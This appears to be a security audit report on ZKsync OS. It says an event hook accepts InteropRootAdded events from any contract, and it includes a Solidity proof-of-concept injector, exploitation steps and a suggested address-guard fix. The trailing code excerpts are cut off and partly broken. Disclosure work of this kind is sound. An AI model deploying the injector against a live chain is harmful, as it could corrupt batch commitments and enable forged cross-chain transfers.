### Title
Unpermissioned `InteropRootAdded` Event Injection Corrupts Batch Commitment Rolling Hash - (File: system_hooks/src/event_hooks/interop_root_reporter.rs)

---

### Summary

The `interop_root_reporter_event_hook` processes `InteropRootAdded` events from **any contract** without validating the emitter address. Any unprivileged user can deploy a contract that emits a properly formatted `InteropRootAdded` event to inject arbitrary interop roots into the system's `interop_root_storage`, corrupting the `interop_roots_rolling_hash` included in the batch commitment.

---

### Finding Description

`interop_root_reporter_event_hook` in `system_hooks/src/event_hooks/interop_root_reporter.rs` is invoked for every event emitted during transaction execution. The function signature does not include the emitter address as a parameter at all:

```rust
pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<...>,
    data: &[u8],
    _caller_ee: u8,          // execution environment type, NOT emitter address
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
``` [1](#0-0) 

The hook validates only the event signature (`topics[0] == INTEROP_ROOT_ADDED_EVENT_SIG`), data length (96 bytes), ABI offset (32), array length (1), and topics count (3). There is no check on which contract emitted the event: [2](#0-1) 

When all format checks pass, the hook unconditionally calls `system.io.add_interop_root()`: [3](#0-2) 

`add_interop_root` in `basic_system/src/system_implementation/system/io_subsystem.rs` charges native resources and pushes the root into `interop_root_storage` with no content validation: [4](#0-3) 

`push_root` in `zk_ee/src/common_structs/interop_root_storage.rs` performs no validation whatsoever: [5](#0-4) 

At block finalization, `interop_roots_rolling_hash` is computed over **all** roots in `interop_root_storage` — including attacker-injected ones — and committed into the batch output: [6](#0-5) 

The `interop_root_storage` is snapshotted per IO frame and rolled back on revert, so the attacker's transaction must succeed for the injection to persist: [7](#0-6) 

The legitimate path for importing interop roots is via operator-only service transactions (type `0x7D`) targeting `L2_INTEROP_ROOT_STORAGE_ADDRESS` with selector `addInteropRootsInBatch`. These are restricted to service blocks and have no signature: [8](#0-7) 

The event hook was designed to capture `InteropRootAdded` events emitted by the `L2_INTEROP_ROOT_STORAGE_ADDRESS` contract during service transaction execution, but the missing address guard means any contract can trigger it.

---

### Impact Explanation

An attacker who injects fake interop roots corrupts the `interop_roots_rolling_hash` committed in the batch. This hash is the settlement layer's authoritative record of which cross-chain roots were imported in the batch. Consequences:

1. **Batch commitment integrity broken**: The committed `interop_roots_rolling_hash` diverges from the set of roots actually imported via legitimate service transactions, making the batch commitment incorrect.
2. **Cross-chain message verification failure**: Downstream consumers (settlement layer, bridge contracts) that verify cross-chain messages against the committed rolling hash will encounter mismatches, causing legitimate cross-chain operations to fail.
3. **Potential forged cross-chain message acceptance**: If an attacker injects a root they control (i.e., a Merkle root of a fake cross-chain message tree they constructed), they can later supply a valid Merkle proof against that root to the settlement layer, potentially enabling unauthorized cross-chain asset transfers.

---

### Likelihood Explanation

Exploitation requires no privileged access, no leaked keys, and no governance majority. Any user can:

1. Deploy a contract that emits `InteropRootAdded(uint256 chainId, uint256 blockOrBatchNumber, bytes32[] sides)` with a crafted payload.
2. Submit a normal L2 transaction calling that contract.
3. The hook fires unconditionally, injecting the fake root into `interop_root_storage`.

The only cost is the native resource charge in `add_interop_root` (approximately `INTEROP_ROOT_STORAGE_NATIVE_COST + per_root_computational_native_cost()` native units), which is negligible. [9](#0-8) 

---

### Recommendation

Pass the emitter address into the event hook dispatch and add an explicit address guard in `interop_root_reporter_event_hook`:

```rust
pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    emitter: &B160,          // add emitter address parameter
    topics: &arrayvec::ArrayVec<...>,
    data: &[u8],
    _caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError> {
    // Guard: only accept events from the canonical interop root storage contract
    if emitter != &L2_INTEROP_ROOT_STORAGE_ADDRESS {
        return Ok(());
    }
    // ... existing checks ...
}
```

The `L2_INTEROP_ROOT_STORAGE_ADDRESS` constant is already defined in `system_hooks/src/addresses_constants.rs` and used throughout the codebase. [10](#0-9)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract InteropRootInjector {
    // InteropRootAdded(uint256,uint256,bytes32[])
    // keccak256 = 0x6b451b8422636e45b93bf7f594fa2c1769d039766c4254a6e7f9c0ee1715cdb0
    bytes32 constant SIG = 0x6b451b8422636e45b93bf7f594fa2c1769d039766c4254a6e7f9c0ee1715cdb0;

    function inject(uint256 chainId, uint256 blockNum, bytes32 fakeRoot) external {
        // Emit InteropRootAdded with exactly the format the hook expects:
        // data = abi.encode(offset=32, len=1, fakeRoot)  → 96 bytes
        // topics = [SIG, chainId, blockNum]              → 3 topics
        bytes32[] memory sides = new bytes32[](1);
        sides[0] = fakeRoot;
        emit InteropRootAdded(chainId, blockNum, sides);
    }

    event InteropRootAdded(
        uint256 indexed chainId,
        uint256 indexed blockOrBatchNumber,
        bytes32[] sides
    );
}
```

Steps:
1. Deploy `InteropRootInjector` on ZKsync OS.
2. Call `inject(1, 42, 0xdeadbeef...01)` in a normal L2 transaction.
3. `interop_root_reporter_event_hook` fires, passes all format checks, and calls `add_interop_root` with the fake root.
4. At block finalization, `interop_roots_rolling_hash` is computed over the injected root alongside any legitimate roots, producing a corrupted batch commitment.

pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<<S::IOTypes as SystemIOTypesConfig>::EventKey, MAX_EVENT_TOPICS>,
    data: &[u8],
    _caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
where
{
    // First, ensure we're capturing the InteropRootAdded event
    if topics.is_empty() || topics[0].as_u8_array() != INTEROP_ROOT_ADDED_EVENT_SIG {
        return Ok(());
    }
    // Internal error if the data supplied doesn't match the expected value
    if data.len() != 96 {
        return Err(internal_error!("Interop root reporter event hook received bad data").into());
    }

    // Parse data
    let offset: u32 = match U256::from_be_slice(&data[..32]).try_into() {
        Ok(offset) => offset,
        Err(_) => {
            return Err(
                internal_error!("Interop root reporter event hook received bad offset").into(),
            );
        }
    };
    // This event is part of the system, but we check it anyways
    if offset != 32 {
        return Err(internal_error!("Interop root reporter event hook received bad offset").into());
    }

    let len: u32 = match U256::from_be_slice(&data[32..64]).try_into() {
        Ok(offset) => offset,
        Err(_) => {
            return Err(
                internal_error!("Interop root reporter event hook received bad length").into(),
            );
        }
    };
    // It should have exactly one side
    if len != 1 {
        return Err(internal_error!("Interop root reporter event hook received bad length").into());
    }
    // Validate topics length
    if topics.len() != 3 {
        return Err(internal_error!("Interop root reporter event hook received bad topics").into());
    }

    let root = Bytes32::from_array(data[64..96].try_into().unwrap());
    let chain_id = U256::from_be_bytes(topics[1].as_u8_array());
    let block_or_batch_number = U256::from_be_bytes(topics[2].as_u8_array());
    system.io.add_interop_root(
        ExecutionEnvironmentType::NoEE,
        resources,
        InteropRoot {
            root,
            block_or_batch_number,
            chain_id,
        },
    )?;
```

    fn add_interop_root(
        &mut self,
        _ee_type: ExecutionEnvironmentType,
        resources: &mut Self::Resources,

    ) -> Result<(), SystemError> {
        // For native we charge for the storage and the computation of the rolling

            INTEROP_ROOT_STORAGE_NATIVE_COST + per_root_computational_native_cost(),

        resources.charge(&to_charge)?;

        self.interop_root_storage.push_root(interop_root)
    }

/// Used for system operations, such as importing interop roots.

/// They have no signature, as they are added directly by the operator.
